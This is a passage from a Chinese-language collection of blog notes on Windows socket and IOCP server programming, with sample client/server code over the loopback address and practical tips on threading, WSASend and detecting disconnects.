HIBYTE( wsaData.wVersion ) != 2 ) &#123; // 检查版本号是否正确 WSACleanup( ); return -1; &#125; // 创建socket操作，建立流式套接字，返回套接字号sockClient sockClient = socket(AF_INET, SOCK_STREAM, 0); if(sockClient == INVALID_SOCKET) &#123; printf(&quot;Error at socket():%ld\\n&quot;, WSAGetLastError()); WSACleanup(); return -1; &#125; // 将套接字sockClient与远程主机相连 // int connect( SOCKET s, const struct sockaddr* name, int namelen); // 第一个参数：需要进行连接操作的套接字 // 第二个参数：设定所需要连接的地址信息 // 第三个参数：地址的长度 SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); // 本地回路地址是127.0.0.1; addrSrv.sin_family = AF_INET; addrSrv.sin_port = htons(DefaultPort); while(SOCKET_ERROR == connect(sockClient, (SOCKADDR*)&amp;addrSrv, sizeof(SOCKADDR)))&#123; // 如果还没连接上服务器则要求重连 cout &lt;&lt; &quot;服务器连接失败，是否重新连接？（Y/N):&quot;; char choice; while(cin &gt;&gt; choice &amp;&amp; (!((choice != &#x27;Y&#x27; &amp;&amp; choice == &#x27;N&#x27;) || (choice == &#x27;Y&#x27; &amp;&amp; choice != &#x27;N&#x27;))))&#123; cout &lt;&lt; &quot;输入错误，请重新输入:&quot;; cin.sync(); cin.clear(); &#125; if (choice == &#x27;Y&#x27;)&#123; continue; &#125; else&#123; cout &lt;&lt; &quot;退出系统中...&quot;; system(&quot;pause&quot;); return 0; &#125; &#125; cin.sync(); cout &lt;&lt; &quot;本客户端已准备就绪，用户可直接输入文字向服务器反馈信息。\\n&quot;; send(sockClient, &quot;\\nAttention: A Client has enter...\\n&quot;, 200, 0); bufferMutex = CreateSemaphore(NULL, 1, 1, NULL); DWORD WINAPI SendMessageThread(LPVOID IpParameter); DWORD WINAPI ReceiveMessageThread(LPVOID IpParameter); HANDLE sendThread = CreateThread(NULL, 0, SendMessageThread, NULL, 0, NULL); HANDLE receiveThread = CreateThread(NULL, 0, ReceiveMessageThread, NULL, 0, NULL); WaitForSingleObject(sendThread, INFINITE); // 等待线程结束 closesocket(sockClient); CloseHandle(sendThread); CloseHandle(receiveThread); CloseHandle(bufferMutex); WSACleanup(); // 终止对套接字库的使用 printf(&quot;End linking...\\n&quot;); printf(&quot;\\n&quot;); system(&quot;pause&quot;); return 0;&#125; DWORD WINAPI SendMessageThread(LPVOID IpParameter)&#123; while(1)&#123; string talk; getline(cin, talk); WaitForSingleObject(bufferMutex, INFINITE); // P（资源未被占用） if(&quot;quit&quot; == talk)&#123; talk.push_back(&#x27;\\0&#x27;); send(sockClient, talk.c_str(), 200, 0); break; &#125; else&#123; talk.append(&quot;\\n&quot;); &#125; printf(&quot;\\nI Say:(\\&quot;quit\\&quot;to exit):&quot;); cout &lt;&lt; talk; send(sockClient, talk.c_str(), 200, 0); // 发送信息 ReleaseSemaphore(bufferMutex, 1, NULL); // V（资源占用完毕） &#125; return 0;&#125;DWORD WINAPI ReceiveMessageThread(LPVOID IpParameter)&#123; while(1)&#123; char recvBuf[300]; recv(sockClient, recvBuf, 200, 0); WaitForSingleObject(bufferMutex, INFINITE); // P（资源未被占用） printf(&quot;%s Says: %s&quot;, &quot;Server&quot;, recvBuf); // 接收信息 ReleaseSemaphore(bufferMutex, 1, NULL); // V（资源占用完毕） &#125; return 0;&#125; ※实现UDP IOCP心得-zt[11] TCP的IOCP是在Accept之后，将Accept创建的套接字与完成端口绑定，而在UDP中，则是把WSASocket或Socket创建的套接字与完成端口绑定。在实现UDP IOCP时，可以参考已有的TCP IOCP代码，例如http://www.cppblog.com/niewenlong/archive/2007/08/17/30224.html 另外http://www.codeproject.com/KB/IP/iocp-multicast-udp.aspx可供下的源码中的客户端代码是UDP IOCP实现 以下数据结构非常重要。 1234567891011121314151617typedef struct _PER_IO_OPERATION_DATA&#123; OVERLAPPED Overlapped; WSABUF DataBuff; char Buff[24]; BOOL OperationType;&#125;PER_IO_OPERATION_DATA,* LPPER_IO_OPERATION_DATA;因为在UDP中每次RecvFrom获WSARecvFrom会传回UDP数据来源的IP，因此可以将以上数据结构修改成：typedef struct _PER_IO_OPERATION_DATA&#123; OVERLAPPED Overlapped; WSABUF DataBuff; char Buff[24]; unsigned long recvBytes; //存储接收到的字节数 SOCKADDR_IN remoteAddr; //存储数据来源IP地址 int remoteAddrLen; //存储数据来源IP地址长度&#125;PER_IO_OPERATION_DATA,* LPPER_IO_OPERATION_DATA; 实现过程 创建LPPER_IO_OPERATION_DATA数据结构并进行初始化（初始化很重要） 1234567891011121314151617181920212223242526272829303132333435363738LPPER_IO_OPERATION_DATA ioperdata;ioperdata = (LPPER_IO_OPERATION_DATA)malloc(sizeof(PER_IO_OPERATION_DATA));memset(&amp;(ioperdata-&gt;Overlapped), 0, sizeof(OVERLAPPED));(ioperdata-&gt;DataBuff).len = 24;(ioperdata-&gt;DataBuff).buf = ioperdata-&gt;Buff;ioperdata-&gt;recvBytes = 24;ioperdata-&gt;remoteAddrLen = sizeof(ioperdata-&gt;remoteAddr);//创建完成端口hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0); //创建UDP socketudpSocket = WSASocket(AF_INET, SOCK_DGRAM, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED);//绑定UDP Socketbind(udpSocket, (SOCKADDR*) &amp; addr, sizeof(SOCKADDR_IN));//将完成端口与UDP Socket绑定 CreateIoCompletionPort( (HANDLE)udpSocket, hCompletionPort, (DWORD)udpSocket, 5 );//根据CPU数量*2+2的原则创建工作者线程------- ------- --------------一直循环CreateWorkers(m_dwThreads)//接收数据 WSARecvFrom( udpSocket, &amp;(ioperdata-&gt;DataBuff), 1, &amp;(ioperdata-&gt;recvBytes), &amp;flags, (SOCKADDR*) &amp; (ioperdata-&gt;remoteAddr), &amp;(ioperdata-&gt;remoteAddrLen), &amp;(ioperdata-&gt;Overlapped), NULL); //获得当前完成状态 GetQueuedCompletionStatus(ComPort,&amp;BytesTransferred,(LPDWORD) &amp; nSocket,(LPOVERLAPPED *) &amp; PerIoData,INFINITE ); //处理接收到的数据//继续执行投递操作（类同接收数据操作） WSAGetLastError错误代码通过WSAGetLastError的信息来测试程序中出现的问题，常见的错误有10055、10014、6等，最主要的是变量的初始化。 ※使用IOCP需要注意的一些问题~~(不断补充)[12] 1- 不要为每个小数据包发送一个IOCP请求,这样很容易耗尽IOCP的内部队列…从而产生10055错误. 2- 不要试图在发送出IOCP请求之后,收到完成通知之前修改请求中使用的数据缓冲的内容,因为在这段时间,系统可能会来读取这些缓冲. 3- 为了避免内存拷贝,可以尝试关闭SOCKET的发送和接收缓冲区,不过代价是,你需要更多的接收请求POST到一个数据流量比较大的SOCKET,从而保证系统一直可以找到BUFFER来收取到来的数据. 4- 在发出多个接收请求的时候,如果你的WORKTHREAD不止一个,一定要使用一些手段来保证接收完成的数据按照发送接收请求的顺序处理,否则,你会遇到数据包用混乱的顺序排列在你的处理队列里… 5- 说起工作线程, 最好要根据MS的建议, 开 CPU个数*2+2 个, 如果你不了解IOCP的工作原理的话. 6- IOCP的工作线程是系统优化和调度的, 自己就不需要进行额外的工作了.如果您自信您的智慧和经验超过MS的工程师, 那你还需要IOCP么… 7-发出一个Send请求之后，就不需要再去检测是否发送完整，因为iocp会帮你做这件事情，有些人说iocp没有做这件事情，这和iocp的高效能是相悖的，并且我做过的无数次测试表明，Iocp要么断开连接，要么就帮你把每个发送请求都发送完整。 8- 出现数据错乱的时候，不要慌，要从多线程的角度检查你的解析和发送数据包的代码，看看是不是有顺序上的问题。 9- 当遇到奇怪的内存问题时，逐渐的减少工作线程的数量，可以帮你更快的锁定问题发生的潜在位置。 10-同样是遇到内存问题时，请先去检查你的客户端在服务器端内部映射对象的释放是否有问题。而且要小心的编写iocp完成失败的处理代码，防止引用一个错误的内部映射对象的地址。 11- overlapped对象一定要保存在持久的位置，并且不到操作完成（不管成功还是失败）不要释放，否则可能会引发各种奇怪的问题。 12- IOCP的所有工作都是在获取完成状态的那个函数内部进行调度和完成的，所以除了注意工作线程的数量之外，还要注意，尽量保持足够多的工作线程处在获取完成状态的那个等待里面，这样做就需要减少工作线程的负担，确保工作线程内部要处理费时的工作。（我的建议是工作线程和逻辑线程彻底区分开） 13- 刚刚想起来，overlapped对象要为每次的send和recv操作都准备一个全新的，不能图方便重复利用。 14- 尽量保持send和recv的缓冲的大小是系统页面大小的倍数，因为系统发送或者接收数据的时候，会锁用户内存的，比页面小的缓冲会浪费掉整个一个页面。（作为第一条的补充，建议把小包合并成大包发送） ※IOCP的例子[13] 以前在书上看过了IOCP，不过一直都没有写过代码。现在写的时候，着时对很多问题摸不着头脑。不过好在CSDN上有许多的对于IOCP问题的讨论帖，让我受益非浅啊，也把心中的一些迷茫解开了，下面给出的是可以运行的IOCP的C/S代码，自已试了在一个机器上开了一百来个客户端，跑起来暂时没出现问题（因为通信内容太简单了-)。 IOCP的三个函数：CreateIoCompletionPort、GetQueuedCompletionStatus、PostQueuedCompletionStatus；一个是用来创建想要的IOCP的HANDLE同时也是用来把我们想要的SOCKET绑定到这个HANDLE上，一个是获取IO这个HANDLE上对应的对列的状态，看有没有事件完成，一个是用来通知所有工作线程退出（这个函数我还没用到，关于这个功用是看资料上说的）。 我在写这个代码的时候，最主要的问题就是当通信完成了之后，是怎么样来判断是哪个SOCKET的哪个状态（SEND还是RECV）完成了。《WINDOWS网络编程》这本书里给的代码不是很全的哦，它的配套光盘又没有，不过好在CSDN里CB那块中有个朋友刚好帖出了这一章的代码。通过比较和一夜的思量，算是搞明白啦。主要的就是以下的数据： 1、在第二次CreateIoCompletionPort中，会传进去一个CompletionKey，这个就是要来关联到我们想要的SOCKET上的一些感兴趣的数据内容，当然最好是要一个SOCKET，也可以是其它，看自己程序的需要了。而通过GetQueueCompletionStatus的通过，就可以获得这些数据的地址了。 1234typedef struct _PER_HANDLE_DATA&#123; SOCKET sock;&#125;PER_HANDLE_DATA,* LPPER_HANDLE_DATA; 2、第二个主要的数据结构就是这个了，现在真的是佩服当初设计这个结构的人啊（没办法，自己就是没想到这样利用法）。因为在POST操作（SEND或是RECV）是，都要一个OVERLAPPED，所以就把这个OVERLAPPED和要指明这次POST操作类型的代码OperationType（POST_SEND或POST_RECV）以及其它一些数据（比如接发收的缓冲）。这样子，在GetQueueCompletionStatus的时候，通过获取事件，也同时得到了OperationType和缓冲。这样，知道了通信类型，也得到了缓冲数据的缓冲区。这样就可以控制我们的通信了。 这个例子比较简单，没有复杂的数据处理过程（正在设计中，和大家交流交流）。用的是BCB的平台，不过写法上还是和VC里的一模一样的啊。 1234567typedef struct _PER_IO_OPERATION_DATA&#123; OVERLAPPED Overlapped; WSABUF DataBuff[1]; char Buff[24]; BOOL OperationType;&#125;PER_IO_OPERATION_DATA,* LPPER_IO_OPERATION_DATA; 简单的客户端： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//---------------------------------------------------------------------------#pragma hdrstop#include &lt;winsock2.h&gt;#include &lt;stdio.h&gt;#include &lt;iostream&gt;using namespace std;//---------------------------------------------------------------------------#pragma argsusedSOCKET sockClient;struct sockaddr_in addrServer;char buf[24];int n = 0;int Init();int main(int argc, char* argv[])&#123; if(Init() != 0) goto theend; sockClient = socket(AF_INET,SOCK_STREAM,0); if(sockClient == INVALID_SOCKET) &#123; cout&lt;&lt;&quot;socket 失败&quot;&lt;&lt;endl; WSACleanup(); goto theend; &#125; memset(&amp;addrServer,0,sizeof(sockaddr_in)); addrServer.sin_family = AF_INET; addrServer.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); addrServer.sin_port = htons(9090); cout&lt;&lt;&quot;连接服务器...&quot;&lt;&lt;endl; if(connect(sockClient,(const struct sockaddr *)&amp;addrServer,sizeof(sockaddr)) != 0) &#123; cout&lt;&lt;&quot;connect 失败&quot;&lt;&lt;endl; WSACleanup(); goto theend; &#125; cout&lt;&lt;&quot;开始发送测试包&quot;&lt;&lt;endl; memset(buf,0,24); while(true) &#123; sprintf(buf,&quot;第%d个包&quot;, n); cout&lt;&lt;&quot;发送：&quot;&lt;&lt;buf&lt;&lt;endl; if(send(sockClient,buf,strlen(buf),0) &lt;= 0) &#123; cout&lt;&lt;&quot;send失败,可能连接断开&quot;&lt;&lt;endl; //break; goto theend; &#125; memset(buf,0,24); //接收服务端应答 if(recv(sockClient,buf,24,0) &lt;= 0) &#123; cout&lt;&lt;&quot;recv失败,可能连接断开&quot;&lt;&lt;endl; //break; goto theend; &#125; cout&lt;&lt;&quot;服务器应答：&quot;&lt;&lt;buf&lt;&lt;endl; memset(buf,0,24); Sleep(200); n++; &#125; theend: WSACleanup(); getchar(); return 0;&#125;//---------------------------------------------------------------------------int Init()&#123; WSAData wsaData; if(WSAStartup(MAKEWORD(2,2),&amp;wsaData) != 0) &#123; cout&lt;&lt;&quot;WSAStartup失败&quot;&lt;&lt;endl; return -1; &#125; if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) &#123; cout&lt;&lt;&quot;SOCKET版本不对&quot;&lt;&lt;endl; WSACleanup(); return -1; &#125; return 0;&#125; 服务端。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222//---------------------------------------------------------------------------#pragma hdrstop//---------------------------------------------------------------------------#pragma argsused#pragma comment(lib,&quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;winsock2.h&gt;#include &lt;iostream&gt;using namespace std;#define RECV_POSTED 1001#define SEND_POSTED 1002int Init();HANDLE hCompletionPort;typedef struct _PER_HANDLE_DATA&#123; SOCKET sock;&#125;PER_HANDLE_DATA,* LPPER_HANDLE_DATA;typedef struct _PER_IO_OPERATION_DATA&#123; OVERLAPPED Overlapped; WSABUF DataBuff[1]; char Buff[24]; BOOL OperationType;&#125;PER_IO_OPERATION_DATA,* LPPER_IO_OPERATION_DATA;DWORD WINAPI ServerWorkerThread(LPVOID CompletionPort);int main(int argc, char* argv[])&#123; LPPER_HANDLE_DATA perHandleData; LPPER_IO_OPERATION_DATA ioperdata; SYSTEM_INFO siSys; SOCKET sockListen; struct sockaddr_in addrLocal; char buf[24]; int nRet = 0; DWORD nThreadID; SOCKET sockAccept; DWORD dwFlags; DWORD dwRecvBytes; int nReuseAddr = 1; cout&lt;&lt;&quot;初始环境...&quot;&lt;&lt;endl; if(Init() != 0) goto theend; //创建一个IO完成端口 cout&lt;&lt;&quot;创建一个IO完成端口&quot;&lt;&lt;endl; hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,NULL,0,0); if(hCompletionPort == INVALID_HANDLE_VALUE) &#123; cout&lt;&lt;&quot;创建IO完成端口失败&quot;&lt;&lt;endl; goto theend; &#125; //获取CPU数目 GetSystemInfo(&amp;siSys); //创建一定数目的工作者线程，本例中以一个处理器一个线程搭配 for(int i = 0;i&lt;(int)siSys.dwNumberOfProcessors*2;i++)//NumberOfProcessors &#123; HANDLE hThread; hThread = CreateThread(NULL,0,ServerWorkerThread,(LPVOID)hCompletionPort,0,&amp;nThreadID); cout&lt;&lt;&quot;创建工作者线程&quot;&lt;&lt;i&lt;&lt;endl; CloseHandle(hThread); &#125; //创建监听SOCKET cout&lt;&lt;&quot;创建监听SOCKET&quot;&lt;&lt;endl; sockListen = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED); if(sockListen == SOCKET_ERROR) &#123; cout&lt;&lt;&quot;WSASocket错误&quot;&lt;&lt;endl; goto theend; &#125; if(setsockopt(sockListen,SOL_SOCKET,SO_REUSEADDR,(const char *)&amp;nReuseAddr,sizeof(int)) != 0) &#123; cout&lt;&lt;&quot;setsockopt错误&quot;&lt;&lt;endl; goto theend; &#125; addrLocal.sin_family = AF_INET; addrLocal.sin_addr.s_addr = htonl(INADDR_ANY); addrLocal.sin_port = htons(9090); if(bind(sockListen,(struct sockaddr *)&amp;addrLocal,sizeof(sockaddr_in)) != 0) &#123; cout&lt;&lt;&quot;bind错误&quot;&lt;&lt;endl; int n = WSAGetLastError(); goto theend; &#125; //准备监听 cout&lt;&lt;&quot;准备监听&quot;&lt;&lt;endl; if(listen(sockListen,5)!=0) &#123; cout&lt;&lt;&quot;listen错误&quot;&lt;&lt;endl; goto theend; &#125; while(true) &#123; //接收用户连接，被和完成端口关联 sockAccept = WSAAccept(sockListen,NULL,NULL,NULL,0); perHandleData = (LPPER_HANDLE_DATA)malloc(sizeof(PER_HANDLE_DATA)); if(perHandleData == NULL) continue; cout&lt;&lt;&quot;socket number &quot;&lt;&lt;sockAccept&lt;&lt;&quot;接入&quot;&lt;&lt;endl; perHandleData-&gt;sock = sockAccept; ioperdata = (LPPER_IO_OPERATION_DATA)malloc(sizeof(PER_IO_OPERATION_DATA)); memset(&amp;(ioperdata-&gt;Overlapped),0,sizeof(OVERLAPPED)); (ioperdata-&gt;DataBuff[0]).len = 24; (ioperdata-&gt;DataBuff[0]).buf = ioperdata-&gt;Buff; ioperdata-&gt;OperationType = RECV_POSTED; if( ioperdata == NULL) &#123; free(perHandleData); continue; &#125; //关联 cout&lt;&lt;&quot;关联SOCKET和完成端口&quot;&lt;&lt;endl; if(CreateIoCompletionPort((HANDLE)sockAccept,hCompletionPort,(DWORD)perHandleData,1) == NULL) &#123; cout&lt;&lt;sockAccept&lt;&lt;&quot;createiocompletionport错误&quot;&lt;&lt;endl; free(perHandleData); free(ioperdata); continue; &#125; //投递接收操作 cout&lt;&lt;&quot;投递接收操作&quot;&lt;&lt;endl; WSARecv(perHandleData-&gt;sock,ioperdata-&gt;DataBuff,1,&amp;dwRecvBytes,&amp;dwFlags,&amp;(ioperdata-&gt;Overlapped),NULL); &#125;theend: getchar(); return 0;&#125;//---------------------------------------------------------------------------int Init()&#123; WSAData wsaData; if(WSAStartup(MAKEWORD(2,2),&amp;wsaData) != 0) &#123; cout&lt;&lt;&quot;WSAStartup失败&quot;&lt;&lt;endl; return -1; &#125; if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) &#123; cout&lt;&lt;&quot;SOCKET版本不对&quot;&lt;&lt;endl; WSACleanup(); return -1; &#125; return 0;&#125;DWORD WINAPI ServerWorkerThread(LPVOID CompletionPort)&#123; HANDLE ComPort = (HANDLE)CompletionPort; DWORD BytesTransferred; LPOVERLAPPED Overlapped; LPPER_HANDLE_DATA PerHandleData; LPPER_IO_OPERATION_DATA PerIoData; DWORD SendBytes,RecvBytes; DWORD Flags; BOOL bT; while(TRUE) &#123; //等待完成端口上SOCKET的完成 cout&lt;&lt;&quot;等待完成端口上SOCKET的完成&quot;&lt;&lt;endl; bT = GetQueuedCompletionStatus(ComPort, &amp;BytesTransferred,(LPDWORD)&amp;PerHandleData, (LPOVERLAPPED *)&amp;PerIoData,INFINITE); //检查是否有错误产生 if(BytesTransferred == 0 &amp;&amp; (PerIoData-&gt;OperationType == RECV_POSTED || PerIoData-&gt;OperationType == SEND_POSTED)) &#123; //关闭SOCKET cout&lt;&lt;PerHandleData-&gt;sock&lt;&lt;&quot;SOCKET关闭&quot;&lt;&lt;endl; closesocket(PerHandleData-&gt;sock); free(PerHandleData); free(PerIoData); continue; &#125; //为请求服务 if(PerIoData-&gt;OperationType == RECV_POSTED) &#123; //处理 cout&lt;&lt;&quot;接收处理&quot;&lt;&lt;endl; cout&lt;&lt;PerHandleData-&gt;sock&lt;&lt;&quot;SOCKET :&quot;&lt;&lt;PerIoData-&gt;Buff&lt;&lt;endl; //回应客户端 ZeroMemory(PerIoData-&gt;Buff,24); strcpy(PerIoData-&gt;Buff,&quot;OK&quot;); Flags = 0; ZeroMemory((LPVOID)&amp;(PerIoData-&gt;Overlapped),sizeof(OVERLAPPED)); PerIoData-&gt;DataBuff[0].len = 2; PerIoData-&gt;DataBuff[0].buf = PerIoData-&gt;Buff; PerIoData-&gt;OperationType = SEND_POSTED; WSASend(PerHandleData-&gt;sock,PerIoData-&gt;DataBuff, 1,&amp;SendBytes,0,&amp;(PerIoData-&gt;Overlapped),NULL); &#125; else //if(PerIoData-&gt;OperationType == SEND_POSTED) &#123; //发送时的处理 cout&lt;&lt;&quot;发送处理&quot;&lt;&lt;endl; Flags = 0; ZeroMemory((LPVOID)&amp;(PerIoData-&gt;Overlapped),sizeof(OVERLAPPED)); ZeroMemory(PerIoData-&gt;Buff,24); PerIoData-&gt;DataBuff[0].len = 24; PerIoData-&gt;DataBuff[0].buf = PerIoData-&gt;Buff; PerIoData-&gt;OperationType = RECV_POSTED; WSARecv(PerHandleData-&gt;sock,PerIoData-&gt;DataBuff, 1,&amp;RecvBytes,&amp;Flags,&amp;(PerIoData-&gt;Overlapped),NULL); &#125; &#125;&#125; ※IOCP完全开发经验总结 ※（一）：简介[14] 一、后台框架： 1、IOCP内核库 库使用VC6开发（因为编译和运行快，文件小，依赖少），整体就是一个dll，主要封装了IOCP的核心代码，提供了非常多的C函数供使用。 2、Qt封装IOCP的库 这是第一层封装，将Dll库封装为一个类，完成了所有导出函数、句柄的封装，和IOCP库的载入和卸载。 3、Server封装 这是第二层封装，主要加入和解决了以下问题： 1、TCP数据的粘包处理，定义了数据的类型、简单验证、加密等。 2、随机数的同步。 3、定义了用户、群、群主的数据结构和功能，完善了群的管理（包括查找、进入和离开群，创建和解散群，群主的更换和T人，群数据发送和用户信息同步等）。 4、GameServer封装 这主要实现了业务逻辑，也做了其他一些亮点功能，比如多线程完成日志的记录、数据库的查询等。二、内核库介绍 1、心跳机制 windows系统内核的TCP协议里并没有实现心跳，导致客户端异常断开后无法检测到，所以自己实现了一套写在了核心代码里。 2、自定义程度高 导出的函数中有很多set开头的函数，让开发者自定义某些IOCP的运行机制。 3、回调函数 因为库接口是C，所以只能使用回调函数的机制来运行开发者代码，缺点是使用难度有所提高，但我封装的每一层都有回调函数的示例，参照着写即可。 4、池 内核主要有两个池：SocketContext池和IOContext池，运行起来后不会频繁的new和delete，而是通过池来分配和回收，大大降低了new和delete的开销。 5、收发各使用一个IOContext Send维护一个发送队列，且发送一个包的最大长度是8192左右，内核发送大数据时按照这个包自动拆分包，且完善了发送错误处理。 6、锁 把这个单独提出来是因为之前的代码里用到了至少3个锁，分别用来保护两个池和一个SocketClient队列，最近我把内核重新进行了大的重构，把这三个锁都去掉了，实现了无锁IOCP，后期的文章里会慢慢进行说明。 7、其他 内核还处理了各式各样的异常和错误。目前就想起来这么多，除了IOCP核心代码是用小猪的更改而来（修改达到70%左右吧），其他的全部都是自己设计和编写的，后期也会进行开源。顺带说一句，用C++开发全栈真是活的不耐烦了。。。 原理和参考 原理方面的东西我就不赘述了，我是直接从最low模型到IOCP模型的，中间还有其他异步模型，因为都不如IOCP我就直接跳过，这里只讲一些小猪的代码里没提到的坑。关于其他异步模型和IOCP的原理、简单实现只需参考小猪的一篇文章就行：完成端口(CompletionPort)详解 - 手把手教你玩转网络编程系列之三 ※（二）：几个重要问题分析（上）[15] WSASend 小猪的文章里并没有说WSASend如何安全的去用，只是一句话带过，说这个很简单，带着要严谨的科学和研究精神，我看了很多源码示例（包括说是有个很牛逼的老外写的），都没有详细的说这一部分，后来我又找了很多关于WSASend理论（包括MSDN），才总结了一些东西： 1、WSASend如果作为同步IO发送（与Send作用相同时），是非线程安全的，不能同时在多个线程中同时调用。 这个完全理解。 2、WSASend作为异步IO发送时，虽然是非线程安全的，但你可以放心的在多个线程中调用（-_-!）。 微软说的这个让人匪夷所思，我个人认为它不太可能是用了原子操作，而是windows系统本身就是个抢占式OS，也就是说，除非一个线程本身放弃CPU执行权，否则它会一直占用到死。所以它是不会把数据复制到协议栈一部分时跑去执行另一个线程代码。但我认为，对于多核CPU（此时是并行而不是并发），它还是有出错的几率（虽然非常非常低）。 3、不需要对发送失败的WSASend进行重发 这个忘了从哪里看到的了，不过确实如此，如果发送失败，说明TCP连接已经断开了，因为TCP协议本身就是保证传输的可靠性的。 4、其他问题 有博文称，虽然多线程调用WSASend是可以的，但是当你正分段发送一个大数据时，如果正好碰到了发送心跳的线程发送了一个字节的心跳，那么这一颗老鼠屎就坏了一锅汤，整个大数据就全部不能用了。所以，我甚至把心跳的WSASend也放在了同一个线程里。 5、我的方案 虽然上面说了这么多，多心的我还是只在一个线程中调用了WSASend，而且对发送失败的WSASend进行重新发送。 多个还是单个WSARecv、WSASend 我的方案是，一个SocketContext使用一个WSARecv和一个WSASend。下面举出反例：如果用多个WSARecv，假设数据是源源不断且量非常巨大的发到Server端，虽然完成端口队列是FIFO的，且取出的数据也是按顺序的，但我经过实际测试（使用PostQueuedCompletionStatus)，还是会导致包的顺序混乱。原因也很简单，虽然Windows是抢占式OS，但多核CPU的线程有可能会并行的（not并发），所以会导致多个拿到队列中WSARecv数据的线程处理顺序不确定，比如后拿到WSARecv数据的线程会先处理，这就产生了顺序混乱问题。况且也不能保证咱的代码逻辑上完全没问题，所以还是安心用一个WSARecv吧。至于多个WSASend，如果真的和微软说的，WSASend正常情况下不会发送失败的话，我认为多个也无妨，但假设会失败，那你发送了N个WSASend，其中如果一个出了问题，你再重发，那仍然导致了包乱序的问题。反正就一个宗旨：服务端是不能出现任何问题的。那就多写几句放心的代码吧。 多线程VS单线程 当初没想到这个问题，直到看到一个博客，觉得说的也很有道理： 在绝大多数讲解IOCP的文章中都会建议使用多个工作线程来处理IO事件，并且把工作线程数设置为CPU核心数的2倍。根据我的印象，这种说法的出处来自于微软早期的官方文档。不过，在我看来这完全是一种误导。IOCP的设计初衷就是用尽可能少的线程来处理IO事件，因此使用单线程处理本身是没有问题的，这可以使实现简化很多。反之，用多线程来处理的话，必须处处小心线程安全的问题，同时也会涉及到加锁的问题，而不恰当的加锁反而会使性能急剧下降，甚至不如单线程程序。有些同学可能会认为使用多线程可以发挥多核CPU的优势，但是目前CPU的速度足够用来处理IO事件，一般现代CPU的单个核心要处理一块千兆网卡的IO事件是绰绰有余的，最多的可以同时处理2块网卡的IO事件，瓶颈往往在网卡上。如果是想通过多块网卡提升IO吞吐量的话，我的建议是使用多进程来横向扩展，多进程不但可以在单台物理服务器上进行扩展，并且还可以扩展到多台物理服务器上，其伸缩性要比多线程更强。当时微软提出的这个建议我想主要是考虑到在IO线程中除了IO处理之外还有业务逻辑需要处理，使用多线程可以解决业务逻辑阻塞的问题。但是将业务逻辑放在IO线程里处理本身不是一种好的设计模式，这没有很好的做到IO和业务解耦，同时也限制了服务器的伸缩性。良好的设计应该将IO和业务解耦，使用多进程或者多线程将业务逻辑放在另外的进程或者线程里进行处理，而IO线程只需要负责最简单的IO处理，并将收到的消息转发到业务逻辑的进程或者线程里处理就可以了。 原文链接：IOCP编程小结确实，使用单线程的话真会解放很多不必要的麻烦。但我的项目里仍然用了多线程，具体看下面的锁的问题。锁的问题：用还是不用 废话，当然能不用就不用了！起初我项目里至少用了3个锁，分别用来锁两个池（SocketContext和IOContext池）和一个Socket队列。因为有些逻辑在工作线程中处理了，比如AcceptIO返回时，得向Socket队列中加入一个新Socket，从两个池中申请一个IOContext和一个SocketContext继续处理，所以这个函数甚至同时会用到3个锁，另外还有心跳线程遍历时也会锁住Socket队列，这些都会导致运行效率的低下。后来我突然醒悟，小猪的代码可能有点误导，他在工作线程中处理了这些东西，那为何不统一到一个线程中处理呢？换个思维，工作线程只是用来传递数据，然后我们新开辟一个线程（也可以是主线程）来操作两个池、操作和遍历Socket队列、统一调用WSASend不就都解决了？所以我花了一周时间来重写了这块，工作线程所有的操作全都使用事件来发送给主线程来处理（当然你也可以重新开个线程），所以可以去掉所有的锁了。目前运行很顺利，效率就更不用说了。另外因为我用的是Qt，很方便的使用信号槽来给不同线程发送信号（事件），经测试信号槽发送不会因为队列数据过多而发送失败（只会一直涨内存），而以前测试的MFC使用PostMessage时，队列过多会返回FALSE，我也懒得研究过时的东西了，大家只需注意保证成功给处理线程发送事件即可。 ※（二）：几个重要问题分析（中）[16] 优雅的处理连接断开 据我目前遇到的断开类型共有4种：客户端主动断开、客户端异常断开、服务器主动断开和网络出现问题断开。只要系统检测到连接断开后，你在这个socket上投递的所有IOContext都会从队列中返回，只是返回值会不同。 客户端主动断开 一般是客户端调用closesocket函数，这种断开服务器会收到断开的标志，所以服务器上处理很简单：每个你在此socket上投递的IOContext都会从GetQueuedCompletionStatus返回，且函数本身返回TRUE，你传递的dwBytesTransfered会设置为0。 2. 客户端异常断开 一般是客户端异常退出、或者进程被杀导致的断开，但由于网络是畅通的，所以服务端仍然能收到断开信号，只是和客户端主动断开不同的是GetQueuedCompletionStatus会返回FALSE，GetLastError函数会返回 ERROR_NETNAME_DELETED 错误。 3. 服务器主动断开 服务器在调用closesocket后导致的断开，和客户端异常断开不同的是，GetQueuedCompletionStatus会返回FALSE，GetLastError函数会返回 ERROR_CONNECTION_ABORTED 错误。 4. 网络问题断开 这个就比较麻烦了，因为这种断开服务端是无法检测到的（比如网络断开、网络切换等无法发送断开信号时），这种断开检测只能使用心跳机制（服务端发送数据后客户端肯定要有回应，如果谁也不发数据，连接就会一直存在），我看过TCP协议，协议本身是有心跳机制的，可惜windows下好像并没有实现，我自己在网上搜过（setsockopt设置SO_RCVTIMEO,KEEPALIVE），不起任何作用，大家也不用浪费时间了，自己实现一个心跳吧，也不是很难，每过一段时间发送一个字节就行，只要是网络断开了，一般经过15到30秒服务端就能检测到，GetQueuedCompletionStatus会返回FALSE，GetLastError函数会返回 